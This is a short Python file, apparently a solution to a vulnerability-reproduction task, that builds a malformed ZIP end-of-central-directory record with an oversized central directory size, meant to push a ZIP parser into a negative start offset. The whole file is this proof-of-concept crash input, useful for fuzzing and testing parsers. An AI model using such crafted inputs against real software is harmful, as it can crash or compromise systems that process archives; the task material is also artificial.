import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Construct a minimal ZIP EOCD with malformed central directory size to induce negative start offset
        eocd = struct.pack(
            "<IHHHHIIH",
            0x06054B50,  # EOCD signature
            0,           # number of this disk
            0,           # disk with central directory
            0,           # total entries on this disk
            0,           # total entries
            0xFFFFFFFF,  # size of central directory (malformed large value)
            0,           # offset of central directory
            24           # comment length to make total size 46 bytes
        )
        comment = b"\x00" * 24
        return eocd + comment